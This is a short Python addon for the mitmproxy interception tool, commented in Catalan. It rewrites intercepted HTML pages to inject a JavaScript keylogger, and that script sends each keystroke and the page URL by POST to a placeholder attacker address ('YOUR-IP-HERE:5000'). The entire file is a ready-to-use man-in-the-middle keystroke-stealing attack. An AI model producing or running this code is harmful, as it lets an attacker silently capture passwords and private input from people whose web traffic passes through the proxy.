from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "text/html" in flow.response.headers.get("content-type", ""):
        html = flow.response.text

        # Script JS que envia les pulsacions de teclat via fetch POST
        keylogger_script = """
        <script>
        document.addEventListener('keydown', function(event) {
            fetch('http://YOUR-IP-HERE:5000/log', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ key: event.key, url: window.location.href })
            });
        });
        </script>
        """

        # Injectem abans del </body>
        modified_html = html.replace("</body>", keylogger_script + "</body>")
        flow.response.text = modified_html
